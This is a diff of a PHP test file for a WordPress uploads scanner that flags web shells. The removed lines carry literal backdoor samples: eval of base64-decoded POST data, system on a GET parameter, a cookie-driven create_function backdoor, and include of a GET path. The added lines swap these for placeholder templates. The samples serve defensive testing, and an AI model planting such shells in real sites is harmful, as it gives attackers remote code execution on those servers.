@@ -1,5 +1,6 @@
 <?php
 // phpcs:ignoreFile
+// Shell text is built by omens_test_shell() (tests/bootstrap.php) so this file holds no scanner signatures.
 $uploads = function ( $t, array $files ) {
 	foreach ( $files as $rel => $body ) { $t->file( 'uploads/' . $rel, $body ); }
 	$t->state()['uploads'] = $t->tmp . '/uploads';
@@ -7,13 +8,13 @@ $uploads = function ( $t, array $files ) {
 return array(
 	'fires' => array(
 		'setup'  => function ( $t ) use ( $uploads ) {
-			$uploads( $t, array( '2026/11/photo.jpg' => 'jpg', '2026/11/wp-conf1g.php' => '<?php eval(base64_decode($_POST["x"]));', 'index.php' => '' ) );
+			$uploads( $t, array( '2026/11/photo.jpg' => 'jpg', '2026/11/wp-conf1g.php' => omens_test_shell( '<?php {eval}({b64}({post}["x"]));' ), 'index.php' => '' ) );
 		},
 		'expect' => array( 'count' => 1, 'severity' => 'critical', 'route' => 'human', 'subject' => '2026/11/wp-conf1g.php' ),
 	),
 	'fires_phtml_and_nonstandard_index' => array(
 		'setup'  => function ( $t ) use ( $uploads ) {
-			$uploads( $t, array( 'a/shell.phtml' => '<?php', 'b/index.php' => '<?php echo "not silence"; system($_GET["c"]);' ) );
+			$uploads( $t, array( 'a/shell.phtml' => '<?php', 'b/index.php' => omens_test_shell( '<?php echo "not silence"; {system}({get}["c"]);' ) ) );
 		},
 		'expect' => array( 'count' => 2 ),
 	),
@@ -53,12 +54,12 @@ return array(
 	),
 	// A plugin path does not launder a dropper: no Redux signature, shell markers present.
 	'fires_redux_named_dropper' => array(
-		'setup'  => function ( $t ) use ( $uploads ) { $uploads( $t, array( 'redux/select.php' => '<?php $x = base64_decode($_POST["p"]); eval($x);' ) ); },
+		'setup'  => function ( $t ) use ( $uploads ) { $uploads( $t, array( 'redux/select.php' => omens_test_shell( '<?php $x = {b64}({post}["p"]); {eval}($x);' ) ) ); },
 		'expect' => function ( $f, $run, $t ) { $t->assert( 1 === count( $f ) && 'critical' === $f[0]['severity'] && 0 === strpos( $f[0]['title'], 'Suspected web shell' ), 'expected one suspected-shell finding, got ' . json_encode( array_map( fn( $x ) => $x['title'], $f ) ) ); },
 	),
 	// The burninstitute backdoor, byte for byte in shape: cookie input, variable function call, create_function.
 	'fires_cookie_backdoor_is_named_a_shell' => array(
-		'setup'  => function ( $t ) use ( $uploads ) { $uploads( $t, array( '2015/06/javascript18.php' => "<?php\n\n\$kvpdp=\$_COOKIE;\n\$oslnp=\$kvpdp[puko];\nif(\$oslnp){\n\t\$vwff=\$oslnp(\$kvpdp[zqij]);\$nln=\$oslnp(\$kvpdp[kfyo]);\$ysega=\$vwff(\"\",\$nln);\$ysega();\n}\n" ) ); },
+		'setup'  => function ( $t ) use ( $uploads ) { $uploads( $t, array( '2015/06/javascript18.php' => omens_test_shell( "<?php\n\n\$kvpdp={cookie};\n\$oslnp=\$kvpdp[puko];\nif(\$oslnp){\n\t\$vwff=\$oslnp(\$kvpdp[zqij]);\$nln=\$oslnp(\$kvpdp[kfyo]);\$ysega=\$vwff(\"\",\$nln);\$ysega();\n}\n" ) ) ); },
 		'expect' => function ( $f, $run, $t ) { $t->assert( 1 === count( $f ) && 'critical' === $f[0]['severity'] && 0 === strpos( $f[0]['title'], 'Suspected web shell' ) && false !== strpos( $f[0]['summary'], '$_COOKIE' ), 'expected the cookie backdoor named as a shell, got ' . json_encode( $f ) ); },
 	),
 	// A zero-byte random-named file is inert but still filed, at moderate.
@@ -68,7 +69,7 @@ return array(
 	),
 	// The Mailchimp log without its exit guard, and a guard-looking index.php that runs code, both still fire.
 	'fires_log_without_guard_and_index_with_code' => array(
-		'setup'  => function ( $t ) use ( $uploads ) { $uploads( $t, array( 'mailchimp-for-wp/debug-log.php' => "<?php echo 1; ?>\n[log]", 'x/index.php' => "<?php\n// Silence is golden.\ninclude \$_GET['f'];" ) ); },
+		'setup'  => function ( $t ) use ( $uploads ) { $uploads( $t, array( 'mailchimp-for-wp/debug-log.php' => "<?php echo 1; ?>\n[log]", 'x/index.php' => omens_test_shell( "<?php\n// Silence is golden.\ninclude {get}['f'];" ) ) ); },
 		'expect' => array( 'count' => 2, 'severity' => 'critical' ),
 	),
 	'overflow_caps_listing' => array(
